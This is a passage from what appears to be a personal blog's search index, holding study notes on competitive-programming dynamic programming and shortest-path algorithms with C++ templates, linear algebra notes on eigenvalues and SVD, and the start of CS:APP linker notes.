        <tag>CLRS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kuangbin专题十二 基础DP]]></title>
    <url>%2F2017%2F12%2F20%2FACM%2Fkuangbin-12%2F</url>
    <content type="text"><![CDATA[kuangbin 专题十二 基础DPLISdp[ i ]代表前i个数的最长子序列大小 dp[ i ] =max { dp[ j ] + 1 } ( val[ j ] &lt; val[ i ] ) $ O ( n^2 ) $1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int dp[ N ], val[ N ]; int LIS ( int n ) &#123; int mx = 0; for ( int i = 0; i &lt; n; ++i ) &#123; dp[ i ] = 1; for ( int j = 0; j &lt; i; ++j ) &#123; if ( val[ j ] &lt; val[ i ] &amp;&amp; dp[ i ] &lt; dp[ j ] + 1 ) dp[ i ] = dp[ j ] + 1; &#125; if ( mx &lt; dp[ i ] ) mx = dp[ i ]; &#125; return mx; &#125; $ O ( nlgn ) $ http://www.geeksforgeeks.org/longest-monotonically-increasing-subsequence-size-n-log-n/ http://blog.csdn.net/shuangde800/article/details/7474903 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 int val[ N ];//输入的值 int len;//ed数组的长度（LIS长度） int ed[ N ];//每个长度的序列的末尾 //下界，返回 &gt;= 所查找对象的第一个位置 int binary_search ( int i ) &#123; int left, right, mid; left = 0, right = len; while ( left &lt; right ) &#123; mid = left + ( right - left ) / 2; if ( ed[ mid ] &gt;= val[ i ] ) right = mid; else left = mid + 1; &#125; return left; &#125; void LIS ( int n ) &#123; ed[ 1 ] = val[ 1 ]; len = 1; for ( int i = 2; i &lt;= n; ++i ) &#123; //更新最长的末尾 if ( val[ i ] &gt; ed[ len ] ) ed[ ++len ] = val[ i ]; //产生了新的序列，改变旧的长度的末尾 else &#123; // 如果用STL： pos=lower_bound(ed,ed+len,val[i])-ed; int pos = binary_search ( i ); ed[ pos ] = val[ i ]; &#125; printf ( "%d\n", len ); &#125; &#125; LCSdp[ i ][ j ] 代表两个字符串前i / j 个下的最长大小 dp[ i ][ j ] = dp[ i - 1 ][ j - 1 ] + 1 ( val[ i ] == val[ j ] ) dp[ i ][ j ] = max ( dp[ i - 1 ][ j ], dp[ i ][ j - 1 ] ) ( != ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //CLRS 15.4 int len1, len2; char s1[ N ], s2[ N ]; int dp[ N ][ N ]; inline int max ( int a, int b ) &#123; return a &gt; b ? a : b; &#125; void LCS () &#123; for ( int i = 1; i &lt;= len1; i++ ) &#123; for ( int j = 1; j &lt;= len2; j++ ) &#123; if ( s1[ i ] == s2[ j ] ) dp[ i ][ j ] = dp[ i - 1 ][ j - 1 ] + 1; else dp[ i ][ j ] = max ( dp[ i - 1 ][ j ], dp[ i ][ j - 1 ] ); &#125; &#125; &#125; void Print ( int i, int j ) &#123; //当最长的子序列搜索完，但其中一串仍有剩余时，输出 if ( i == 0 || j == 0 ) &#123; return; &#125; //找到公共字符 if ( s1[ i ] == s2[ j ] ) &#123; Print ( i - 1, j - 1 ); printf ( "%c", s1[ i ] ); &#125; else if ( dp[ i - 1 ][ j ] &gt; dp[ i ][ j - 1 ] ) &#123; Print ( i - 1, j ); &#125; else &#123; Print ( i, j - 1 ); &#125; &#125; 完全背包dp[ i ]代表背包重i的时候最大的价值 dp[ i ] = min ( dp[ i ], dp[ i - w[ j ] ] + v[ j ] ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int v[ N ], w[ N ]; // value，weight int dp[ N ]; //n个物品，最多装wei的东西 int knapsack ( int n, int wei ) &#123; memset ( dp, INF, sizeof ( dp ) ); dp[ 0 ] = 0; for ( int i = 1; i &lt;= wei; ++i ) &#123; for ( int j = 0; j &lt; n; ++j ) &#123; if ( i &gt;= w[ j ] ) dp[ i ] = min ( dp[ i ], dp[ i - w[ j ] ] + v[ j ] ); &#125; &#125; return dp[ wei ]; &#125; 题目列表A - Max Sum Plus Plus HDU - 1024 n个数，要求分成m组，使m组的和加起来得到最大值。 dp[i][j]表示前j个数分成i组的最大值。 dp[i][j]=max(dp[i][j-1]+a[j],max(dp[i-1][k])+a[j]) B - Ignatius and the Princess IV HDU - 1029 给n(奇数)个数，定义特殊的数为在序列中出现次数不少于(n+1)/2次的数，找出这个特殊的数 一边输入一边记录个数就好了 C - Monkey and Banana HDU - 1069 给定箱子种类数量n，及对应长宽高，每个箱子数量无限，求其能叠起来的最大高度是多少(上面箱子的长宽严格小于下面箱子) 按照长排序，在求宽关于高的LIS D - Doing Homework HDU - 1074 有n门功课需要完成，每一门功课都有时间期限以及你完成所需要的时间，如果完成的时间超出时间期限多少单位，就会被减多少学分，问以怎样的功课完成顺序，会使减掉的学分最少，有多个解时，输出功课名排列最小的一个。 15个作业状态压缩来做 枚举每一个状态，枚举每个状态新增的那个节点，再计算最小并记录前一个状态 E - Super Jumping! Jumping! Jumping! HDU - 1087 从起点到达终点，只能前行不能后退，且下一步必须比前面的点的值大，求所有走的点的值总和最大是多少。 dp[i] = max(dp[k] + a[j]); 1&lt;=k&lt;=i-1;最大递增子串和。 F - Piggy-Bank HDU - 1114 给出存钱罐本身的重量和装钱后的重量，以及存钱罐中钱的面值和重量，求存钱罐装满时，钱的总和最小是多少 完全背包解题，每种钱币都可以装无限个，注意初始化的值 dp[ i ] = min ( dp[ i ], dp[ i - w[ j ] ] + v[ j ] ); G - 免费馅饼 HDU - 1176 0—10的点，不同时间在每个点上掉下来物品，只能到达左右两边距离为1和本身所在的位置，求最大物品数 dp[x][t] = max ( dp[x-1][t-1],dp[x][t-1],dp[x+1][t-1]) + v[x][t] H - Tickets HDU - 1260 单张或两张一起买，给出一个一个买票和两个两个买票的时间，求最少 dp[ i ] = min ( dp[ i - 1 ] + s[ i ], dp[ i - 2 ] + d[ i - 1 ] ); I - 最少拦截系统 HDU - 1257 求有多少个递减序列 反过来，转换成求整个系列有多少个LIS，则是所求的组数 J - FatMouse’s Speed HDU - 1160 给n个老鼠的体重和速度，求找出一个最长的序列，此序列体重递增速度递减 按体重递增排序，再求最长递增(此递增表示体重递增速度递减)子序列。 dp[i] = max(dp[j]+1) 0&lt;=j&lt;=i-1 K - Jury Compromise POJ - 1015 必须满足辩方总分D和控方总分P的差的绝对值|D-P|最小。如果有多种选择方案的 |D-P| 值相同，那么选辩控双方总分之和D+P最大的方案即可。 dp(j, k)表示，取j 个候选人，使其辩控差为k 的所有方案中，辩控和最大的那个方案的辩控和。 综上：dp[j][k]=dp[j-1][k-V[i]]+S[i] 正向计算，输出的时候就用正向的输出了,不过每次都要查找下一个位置是否在之前用过了 L - Common Subsequence POJ - 1458 LCS LCS模板 M - Help Jimmy POJ - 1661 老鼠在时刻0从高于所有平台的某处开始下落.当Jimmy落到某个平台上时，游戏者选择让它向左还是向右跑.当Jimmy跑到平台的边缘时，开始继续下落。Jimmy每次下落的高度不能超过MAX dp[i][0] = min(dp[k][0]+l[i]-l[k], dp[k][1]+r[i]-l[k]) + h[i]-h[k]; (左左和左右取最小)dp[i][1] = min(dp[k][0]+r[i]-l[k], dp[k][1]+r[i]-r[k]) + h[i]-h[k];(右左和右右取最小) N - Longest Ordered Subsequence POJ - 2533 LIS LIS模板 O - Treats for the Cows POJ - 3186 n个数在一个双端队列中，每次从队首或队尾出。出的第n个数乘以n，最后加起来，求最大和。 dp[i][j] 代表从i取到j的最大总数dp[i][j] = max(dp[i+1][j]+a[i] (n+i-j) , dp[i][j-1]+a[j] (n+i-j)); P - FatMouse and Cheese HDU - 1078 给定一幅图，每个点有一定权值，现在有一只老鼠在起始点（0,0），他能水平或者垂直移动1~k格之后，停在某点并获得权值，而且每次移动后所在的点，都要比刚离开的那个点的权值更大，求最多能获得多少权值。 DP / Memoized dp[ x ][ y ] = dp[ xx ][ yy ] + val[ x ][ y ] Q - Phalanx HDU - 2859 给了一个字符串矩阵，求以次对角线方向对称的最大对称矩阵。 每次只需求最外面一层对称个数sum，再和右上角对称矩阵大小加一取最小就行，就求出当前小矩阵的最大对称矩阵。最后取个所有对称矩阵大小的最大值就行。dp[i][j] = min(sum,dp[i-1][j+1]+1); R - Milking Time POJ - 3616 奶牛Bessie在0~N时间段产奶。农夫约翰有M个时间段可以挤奶，时间段f,t内Bessie能挤到的牛奶量e。奶牛产奶后需要休息R小时才能继续下一次产奶，求Bessie最大的挤奶量。 dp[ i ] = max ( dp[ j ] + node[ i ].val, dp[ i ] ) ( node[ j ].ed &lt;= node[ i ].st ) S - Making the Grade POJ - 3666 农夫约翰想修一条尽量平缓的路，路的每一段海拔是A_i，修理后是B_i，花费|A_i – B_i|，求最小花费。 dp[i][j] = min(dp[i – 1][k]) + |A[i] – B[j]| 离散化]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[GSLA ch-6] Eigenvalues and Eigenvectors]]></title>
    <url>%2F2017%2F12%2F14%2FGSLA%2F6%2F</url>
    <content type="text"><![CDATA[Eigenvalues and Eigenvectors6.1 Introductioncertain vectors x are in the same direction as Ax basic equation: ​ $ Ax = \lambda x $ how to compute: let $ det(A-\lambda x)= 0 $ ,find the roots == find eigenvalues, find eigenvectors in Null space $ A^nx = \lambda^n x $ span eigenspace Projection: $ \lambda = 1 $ or 0 Reflection: $ \lambda = 1 $ or -1 Rotation: complex eigenvalues only product of eigenvalues == determinant == product of pivots sum of eigenvalues == sum of diagonal entries ( not pivots ) == trace 6.2 Diagonalizingeigenvectors in columns of S, eigenvalues in diagonal of Λ $ Λ = S^{-1}AS $ $ A = SΛS^{-1} $ Independent x from different λ: $ c_1 λ_1 x_1 + c_2 λ_2 x_2 = 0 $ $ c_1 λ_2 x_2 + c_2 λ_2 x_2 = 0 $ subtract $ (λ_1 - λ_2)c_1x_1 = 0 $ diagonalizability: enough eigenvectors (maybe same λ) so that S is invertible $u_k = A^k u_0 = S \Lambda^k S^{-1}u_0$ $ u_0 = c_1x_1 + c_2x_2 + .. +c_nx_n $ eigenvector basis multiply $\lambda_i ^ k$ add up A,B share same eigenvector matrix S if and only if AB = BA ?Heisenberg uncertainty principle position matrix P, momentum matrix Q, $ QP-PQ = I $ knew P still could not know Q $ |Px||Qx| \ge \frac{1}{2}|x|^2 $ 6.3 Applications to Differential Equations 6.4 Symmetric Matrices real eigenvalues orthonormal eigenvectors Spectral Theorem (principle of axis theorem) $ A = Q\Lambda Q^T $ Normal Matrices $ \bar A^TA = A \bar A^T $ symmetric, skewed-symmetric, orthogonal A has n orthonormal vectors ($ A = Q\Lambda \bar Q ^T $) if and only if A is normal Real Eigenvalues proof: $ Ax = \lambda x $ $ \bar x ^TA = \bar x ^T \bar\lambda $ ( $ A = A^T $ )( conjugate and transpose ) $ \bar x^T A x = \bar x^T \lambda x $ $ \bar x ^ T A x = \bar x ^ T \bar\lambda x $ left side the same therefor $ \lambda == \bar \lambda $ Orthonormal proof: no eigenvalues repeated Allow repeated eigenvalues ( ? Schur’s Theorem ) sum of rank one projection matrices $ A = \lambda_1x_1x_1^T + \lambda_2x_2x_2^T+… $ $ = \lambda_1P_1 +\lambda_2P2+…. $ number of positive pivots == number of positive eigenvalues $ A = LDL^T $ 6.5 Positive Definite MatricesAll λ &gt; 0 quick way to test All pivots positive n eigenvalues positive $ x^TAx $ is positive except x = 0 $ A == R^TR $ (symmetric) and R has independent columns ($ x^T R^TRX &gt;= 0 $) n upper left determinants R can be chosen: rectangular / $ (L\sqrt D)^T $ / $ Q \sqrt\Lambda Q^T $ $x^TAx $ (2*2) = $ ax^2 + 2bxy + cy^2 &gt; 0 $ ( ellipse $ z = x^2/a^2 + y^2/b^2 $ ) Application tilted ellipse $ x^TAx $ lined - up ellipse $ X^T\Lambda X = 1 $ rotation matrix Q axes: eigenvectors half-length: $ 1/\sqrt\lambda $ 6.6 Similar MatricesDEF: A similar to B (A family) $ B = M^{-1}AM $ Property: A and B have same eigenvalues x a eigenvector of A and $ M^{-1}x $ eigenvector of B Jordan Form triple eigenvalues while one eigenvector J with λ in the diagonal and 1 above similar to every matrices with repeated eigenvalues λ and one eigenvector λ repeated only once than J == Λ Jordan Block make A as simple as possible while preserving essential properties 6.7 Singular Value DecompositionSUMMARY $ A = U \Sigma V^T $ $ \Sigma^2 = \Lambda $ (of $ A^TA $ and $ AA^T $ ) $ U = Q $ (of $ AA^T $ in $ R^m $) $ V = Q $ (of $ A^TA $ in $ R^n $) orthonormal basis of row space {$ v_1, v_2, … v_r $} orthonormal basis of null space{ $ v_{r+1}, v_{r+2},…v_n $} orthonormal basis of column space{ $ u_1, u_2,…u_r $} orthonormal basis of left null space { $ u_{r+1}, u_{r+2}, … u_m $} Rotation – Stretch – Rotation $ Av_1 = \sigma_1u_1 $ … so $ AV = U\Sigma $ (m n) (n n) = (m m) (m n) $ V $ and $ U $ are orthogonal matrices $ \Sigma $ = ( old r*r $ \Sigma $ ) + (m-r zero rows) + ( n-r zero columns ) therefore … when A positive definite symmetric $ A = U \Sigma V^T = Q\Lambda Q^{T} $ 7.3 Diagonalization and the Pseudoinversechange bases $ \Lambda { w – w } = S^{-1}{std – w} A_{std} S_{ w – std } $ $ \Sigma { v – u } = U^{-1}{std – u} A{std}V{v – std} $ Polar Decomposition orthogonal and semidefinite rotation and stretching $ A = U\Sigma V^T = ( UV^T ) (V \Sigma V^T) = QH $ Pseudoinverse $ A^+ = V\Sigma^+ U^T $]]></content>
      <categories>
        <category>Introduction to Linear Algebra</category>
      </categories>
      <tags>
        <tag>Linear Algebra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kuangbin专题四 最短路]]></title>
    <url>%2F2017%2F12%2F10%2FACM%2Fkuangbin-4%2F</url>
    <content type="text"><![CDATA[kuangbin专题四 最短路ACM图论存图方式 http://jzqt.github.io/2015/07/21/ACM%E5%9B%BE%E8%AE%BA%E4%B9%8B%E5%AD%98%E5%9B%BE%E6%96%B9%E5%BC%8F/ 单源最短路Dijkstra​ $ O(V^2 + E) $ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 int edg[ N ][ N ]; // weight of each edge int dis[ N ]; // distance of each node from source bool vis[ N ]; // SET S represent for nodes already visited // CLRS 24.3 // s:start point, n: total number of nodes void dijkstra ( int s, int n ) &#123; // INITIALIZE-SINGLE-SOURCE memset ( vis, false, sizeof ( vis ) ); vis[ s ] = true; for ( int i = 1; i &lt;= n; ++i ) dis[ i ] = edg[ s ][ i ]; dis[ s ] = 0; // Extract Min // u for the node, mi for dis[ u ] for ( int i = 1; i &lt;= n - 1; ++i ) &#123; int u = -1, mi = INF; for ( int j = 1; j &lt;= n; ++j ) if ( !vis[ j ] &amp;&amp; dis[ j ] &lt; mi ) mi = dis[ u = j ]; vis[ u ] = true; // Relax edges adjacent to u for ( int j = 1; j &lt;= n; ++j ) if ( !vis[ j ] ) dis[ j ] = min ( dis[ j ], dis[ u ] + edg[ u ][ j ] ); &#125; &#125; Dijkstra + STL priority_queue​ $ O((V+E)lgV) $ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 int head[ N ]; //链式前向星建图 int dis[ N ]; // distance of each node from source bool vis[ N ]; // SET S represent for nodes already visited struct Node &#123; int u, d; // id, dis bool operator&lt; ( const Node &amp;rhs ) const &#123; return d &gt; rhs.d; &#125; &#125;; struct Edge &#123; int u, v, w, nex; &#125; edg[ N ]; // CLRS 24.3 // s:start point void dijkstra ( int s ) &#123; priority_queue&lt;Node&gt; Q; dis[ s ] = 0; Q.push ( ( Node )&#123;s, dis[ s ]&#125; ); while ( !Q.empty () ) &#123; // u = Extract_Min( Q ) Node x = Q.top (); Q.pop (); int u = x.u; if ( vis[ u ] ) continue; vis[ u ] = true; // for each vertex v in G.adj[ u ] for ( int i = head[ u ]; i != -1; i = edg[ i ].nex ) &#123; int v = edg[ i ].v; int w = edg[ i ].w; // relax if ( dis[ v ] &gt; dis[ u ] + w ) &#123; dis[ v ] = dis[ u ] + w; Q.push ( ( Node )&#123;v, dis[ v ]&#125; ); &#125; &#125; &#125; &#125; SPFA (Shortest Path Faster Algorithm)​ $ O(kE) $ ( k &lt; 2 ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 int dis[ N ]; // distance of each node from source bool vis[ N ]; // SET S represent for nodes already visited int cnt[ N ]; //入列次数超过n，有负环 int head[ N ]; //链式前向星 struct edg &#123; int u, v, w, nex; &#125; edg[ N ]; bool SPFA ( int s, int n ) &#123; // INIT memset ( vis, false, sizeof ( vis ) ); vis[ s ] = true; for ( int i = 1; i &lt;= n; ++i ) dis[ i ] = INF; dis[ s ] = 0; memset ( cnt, 0, sizeof ( cnt ) ); cnt[ s ] = 1; // BFS方式的spfa queue&lt;int&gt; Q; Q.push ( s ); while ( !Q.empty () ) &#123; int u = Q.front (); Q.pop (); vis[ u ] = false; // 出队要取消标记 for ( int i = head[ u ]; i != -1; i = edg[ i ].nex ) &#123; int v = edg[ i ].v; // Relax所有出边 if ( dis[ v ] &gt; dis[ u ] + edg[ i ].w ) &#123; dis[ v ] = dis[ u ] + edg[ i ].w; //没入队的标记并入队 if ( !vis[ v ] ) &#123; vis[ v ] = true; Q.push ( v ); // 判断负环 if ( ++cnt[ v ] &gt; n ) return false; &#125; &#125; &#125; &#125; return true; &#125; 贴一个dfs的，自己没写过，感觉dijkstra+heap最好 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int spfa_dfs ( int u ) &#123; vis[ u ] = true; for ( int i = head[ u ]; i != -1; i = edg[ i ].nex ) &#123; int v = edg[ i ].v, w = edg[ i ].w; if ( dis[ u ] + w &lt; dis[ v ] ) &#123; dis[ v ] = dis[ u ] + w; if ( !vis[ v ] ) &#123; if ( spfa_dfs ( v ) ) return 1; &#125; else return 1; &#125; &#125; vis[ u ] = false; return 0; &#125; Bellman-Ford​ $ O(VE) $ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 int dis[ N ]; // distance of each node from source bool vis[ N ]; // SET S represent for nodes already visited struct edg &#123; int u, v, w; &#125; edg[ N ]; //CLRS 24.1 //对每个点，relax所有的边 bool Bellman_Ford ( int n, int e, int s, double num ) &#123; // Initialize Single Sorce( G,s ) for ( int i = 1; i &lt;= n; ++i ) dis[ i ] = 0; dis[ s ] = num; // for i = 1 to |G.V|-1 for ( int i = 0; i &lt; n - 1; ++i ) &#123; // for each edg ( u,v ) in G.E for ( int j = 0; j &lt; e; ++j ) &#123; int u = edg[ j ].u; int v = edg[ j ].v; // Relax if ( dis[ v ] &gt; dis[ u ] + edg[ j ].w ) &#123; dis[ v ] = dis[ u ] + edg[ u ].w; &#125; &#125; &#125; // 存在负环 for ( int i = 0; i &lt; e; ++i ) if ( dis[ edg[ i ].v ] &gt; ( dis[ edg[ i ].u ] - edg[ i ].w ) ) return false; return true; &#125; 适用场景如果是稠密图，Dijkstra+heap比SPFA快。稀疏图则SPFA更快。再就是SPFA可以判断负环 对于极端的链状图，SPFA无疑是最合适的了。每个结只进队一次，标准的O(E)。 朴素的dijkstra对于这样的图就力不从心了：每次循环都过一遍结点，在松弛，然后发现每次O(V)的时间只松弛了一个点。 ​ 多源最短路Floyd1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 void init () &#123; for ( int i = 0; i &lt;= n; ++i ) for ( int j = 0; j &lt;= n; ++j ) &#123; //有向图 w[ i ][ j ] = INF; //记录路径段内的后一点 //也可以改成前一点path[i][j] = i,就要反向输出; path[ i ][ j ] = j; &#125; &#125; // CLRS 25.2 All-Pairs-Shortest-Path void Floyd () &#123; // Dp // 表示所有点只经过集合&#123; 1..k &#125;内的点时的最短路径 // 只经过1的时候relax一次，在添加上经过2后的relax，最后一直到n for ( int k = 1; k &lt;= n; ++k ) //选取每一个起点 for ( int i = 1; i &lt;= n; ++i ) //选取每一个终点 for ( int j = 1; j &lt;= n; ++j ) // i -- j的路径存在 if ( w[ i ][ k ] != INF &amp;&amp; w[ k ][ j ] != INF ) &#123; int tmp = w[ i ][ k ] + w[ k ][ j ]; // d(ij)^k = min &#123; d(ik)^(k-1) + d(kj)^(k-1) &#125; if ( w[ i ][ j ] &gt; tmp ) &#123; w[ i ][ j ] = tmp; //记录后继路径 //前驱path[ i ][ j ] = path[ k ][ j ]; path[ i ][ j ] = path[ i ][ k ]; &#125; &#125; &#125; FLoyd 最小环 + 输出1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 //!!!三个INF相加,INF不能太大,否则会爆掉 const int INF = 0xffffff; const int maxn = 100 + 10; const int maxm = 10000 + 10; // floyd int n, m; int dis[ maxn ][ maxm ]; int pre[ maxn ][ maxm ]; // loop int min_loop, num; int mp[ maxn ][ maxm ]; int path[ maxn ]; //存输出的节点,输出的时候遍历就行了 void dfs ( int i, int j ) &#123; int k = pre[ i ][ j ]; if ( k == 0 ) &#123; path[ num++ ] = j; return; &#125; dfs ( i, k ); dfs ( k, j ); &#125; /*算法思想; *Floyd算法是按照顶点的编号增加的顺序更新最短路径的; *如果存在最小环,则会在这个环中的点编号最大的那个点u更新最短路径之前发现这个环; *即当点u被拿来更新i到j的最短路径的时候,可以发现这个闭合环路; *发现的方法是,更新最短路径前,遍历i,j点对,一定会发现某对i到j的最短路径长度: *dist[i][j]+mp[j][u]+mp[u][i]!=INF,这时s的i和j是当前环中挨着点u的两个点; *因为在之前的最短路径更新过程中,u没有参与更新,所以dist[i][j]所表示的路径中不会有点u,即一定为一个环; * *如果在每个新的点拿来更新最短路径之前遍历i和j验证上面的式子,虽然不能遍历到所有的环; *但是由于dist[i][j]是i到j点的最短路径m所以肯定可以遍历到最小的环; * *如果有负权环,则该算法失效,因为包含负环的图上,dist[i][j]已经不能保证i到j的路径上不会经过同一个点多次了; */ // CLRS 25.2 All-Pairs-Shortest-Path void Floyd () &#123; // Dp // 表示所有点只经过集合&#123; 1..k &#125;内的点时的最短路径 // 只经过1的时候relax一次，在添加上经过2后的relax，最后一直到n for ( int k = 1; k &lt;= n; ++k ) &#123; ////最小环 for ( int i = 1; i &lt; k; ++i ) for ( int j = i + 1; j &lt; k; ++j ) if ( dis[ i ][ j ] + mp[ i ][ k ] + mp[ k ][ j ] &lt; min_loop ) &#123; min_loop = dis[ i ][ j ] + mp[ i ][ k ] + mp[ k ][ j ]; num = 0; path[ num++ ] = i; dfs ( i, j ); path[ num++ ] = k; &#125; ////floyd //选取每一个起点 for ( int i = 1; i &lt;= n; ++i ) //选取每一个终点 for ( int j = 1; j &lt;= n; ++j ) &#123; // d(ij)^k = min &#123; d(ik)^(k-1) + d(kj)^(k-1) &#125; int d = dis[ i ][ k ] + dis[ k ][ j ]; if ( d &lt; dis[ i ][ j ] ) dis[ i ][ j ] = d, pre[ i ][ j ] = k; &#125; &#125; &#125; 题目列表A - Til the Cows Come Home POJ-2387 一个农场有n (1000)个点，有t (2000)条道路连接, 从n到1最短 dijkstra 模板 B - Frogger POJ-2253 无向图一条1~2的路径使得该路径上的最大边权最小. (max Route weight is the minimum among all routes) dijkstra变形 double minimax = max ( mi, v[ j ][ u ] ); C - Heavy Transportation POJ - 1797 ​ 有n个城市，n个城市之间有m条公路或桥梁，每个公路或桥都有一个最大载重量，问从城市1到城市n所能运送到货物到最大重量是多少 ( min Route weight is the maximum among all routes ) dijkstra变形 int maxmini = min ( mi, v[ j ][ u ] ); D - Silver Cow Party POJ - 3268 n个农场，m条单向路，n个牛分别在n个农场，第x农场为终点，问每个牛从所在农场前往x农场的往返路程最小值是多少，求出n个牛中最短路上往返路程的最大的那个 从n个点到1再从1回到n个点，通过调转边的方向两次dijkstra E - Currency Exchange POJ - 1860 有n种货币，你含有num面额的其中一种货币。求有没有可能，在多次兑换后你手中的货币大于num。 求最大路径，反向用Bellman-Ford F - Wormholes POJ - 3259 农场之间有很多条路，以及单向的虫洞，每条路走完会花费一定的时间，而虫洞可以回到之前的时间，问农场主是否能回到自己出发时间前的出发点 SPFA判断负环 G - MPI Maelstrom POJ - 1502 从第一个点出发，求到其他点最短路的最大值 dijkstra 注意下三角矩阵邻接表的建图 H - Cow Contest POJ - 3660 n个牛进行比赛，现已知m个关系， 牛u可以胜过牛v。问最后可以确定排名位数的有几个牛. Floyd判断两两牛之间的关系。如果一个牛可以胜过a个牛，b个牛可以胜过它，那么如果a＋b＝n－1，他的排名就可以确定 I - Arbitrage POJ - 2240 给定多种货币之间的兑换关系，问是否可以套利 Bellman-Ford判断正环（要返回自己所以松弛n次) floyd判断回来后是否&gt;1 J - Invitation Cards POJ - 1511 求源点到各点的往返最短路之和 邻接表逆置（建了两个邻接表） 数据多需要优化SPFA/dijkstra+heap K - Candies POJ - 3159 给n个人分糖果，m组数据a，b，c；意思是a比b少的糖果个数绝对不超过c个，也就是d(b)-d(a) &lt; c，求1比n少的糖果数的最大值。 差分约束，和最短路的松弛一样 数据多，dijkstra+heap L - Subway POJ - 2502 小明步行的速度是10km/h，地铁速度是40km/h，给定家和学校的坐标，再给定多条地铁线路站点的坐标，问小明从家到学校所需的最短时间 dijkstra，建图连接所有的点并赋值时间 M - 昂贵的聘礼 POJ - 1062 每个人可能有直接购买或者交换物品换取折扣这两种方式交易（交换物品要从别人手里买） 等级差之间超过m的不能交易 求用最少的钱买到非洲大酋长的承诺 等级限制采用枚举的方法，分别从lv[ 1 ] - m ~~ lv[ 1 ] + m，每次枚举的区间长度为m,一共m次最短路搜索 N - Tram POJ - 1847 电动巴士在每个十字路口有一个默认方向，走向别的方向需要改动扳手。 dijkstra 每个边初始化为INF,要切换的路 = 1,不用切换 = 0 O - Extended Traffic LightOJ - 1074 给定每条街的拥挤度p(x)，街a到街b的时间就是(p(b)-p(a))**3，求第一个点到第k个点的最短路 SPFA判断负环 dfs记录负环里的点 P - The Shortest Path in Nya Graph HDU - 4725 共n个点，n层(每个点单独一层)，相邻的两层之间权值为w 还有m条额外的边，权值为v，求1到n的最短路 建图 ！！给每个点两个辅助点，一个做出度，一个做入度 Q - Marriage Match IV HDU - 3416 网络流，不会qwq R - 0 or 1 HDU - 4370 X12+X13+…X1n=1,X1n+X2n+…Xn-1n=1,其余行列和相同，求ΣCij*Xij 神一样的建图！！节点1的出度为1.节点n的入度为1.节点2-n-1的入度和出度相等. 问题就相当于求一条最短路，从节点1出发，到节点N. 同时节点1的一个最小环+节点n的一个最小环也是可行解，两者取最小 S - Layout POJ - 3169 两点间可能&lt;= x 或者&gt;=x，求1–&gt;n最大 差分约束，和最短路一样，SPFA判断负环则代表不存在可行解]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[CS:APP-ch7] Linker]]></title>
    <url>%2F2017%2F11%2F11%2FCSAPP%2Flinker%2F</url>
    <content type="text"><![CDATA[LinkerSUMMARY1.链接器的任务 7.6 Symbol Resolution - 符号解析 7.7 Relocation - 重定位 2.链接方式 7.2 ～ 7.9 Static lib - 静态链接 7.10 Shared lib - 链接时的共享库 7.11 Shared lib - 运行时的共享库 3.PIC 7.12 Position Independent Code - 位置无关 7.1 Complier Driver - 编译器驱动1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int referenced_sum ( int *a, int n ); void defined_fun () &#123;&#125; int array[ 2 ] = &#123;1, 2&#125;; int zero_global = 0; static int zero_static = 0; static int ini_static = 7; int ini_global = 8; int uninitialize_global; static int uninitialize_static; const char const_string[ 6 ] = "Hello"; int main () &#123; defined_fun (); int local_val = referenced_sum ( array, 2 ); printf ( "%s\n", const_string ); return local_val; &#125; 1.预处理器(cpp) 将源程序翻译成一个ASCII码的中间文件 main.i 2.C编译器(cc1) 将main.i翻译成一个ASCII汇编语言文件 main.s 3.汇编器(as) 将main.s翻译成一个可重定位目标文件 main.o 4.链接器(ld) 将多个.o文件以及一些必要的系统目标文件组合起来，创建一个可执行目标文件 (ps……..链接出来的程序并不能正常运行）1 ld: warning: cannot find entry symbol _start; defaulting to 00000000004000e8 7.2 Static Library - 静态链接为什么要使用链接器? 1.模块化角度考虑 我们可以把程序分散到不同的小的源代码中，而不是一个巨大的类中。这样带来的好处是可以复用常见的功能/库，比方说 Math library, standard C library. 2.效率角度考虑 改动代码时只需要重新编译改动的文件，其他不受影响。而常用的函数和功能可以封装成库，提供给程序进行调用（节省空间） 链接器的任务主要有两个 1.Symbol Resolution 符号解析 将每个符号的引用和唯一的定义相关联 （符号包括变量名和函数名） 2.Relocation 重定位 将每个符号的定义和一个内存地址相关联 7.3 Object Files - 目标文件3种目标文件 Relocatable 可重定位 1 2 //gcc -c main.c Type: REL (Relocatable file) Executable 可执行 1 2 //ld -o prog main.o sum.o Type: EXEC (Executable file) Shared 可共享 1 2 //gcc main.c 默认 Type: DYN (Shared object file) 目标文件的格式：这里主要讨论ELF格式 7.4 Relocatable Object Files - 可重定位格式：| 组成 | 解释 || ——– | —– || ELF header | 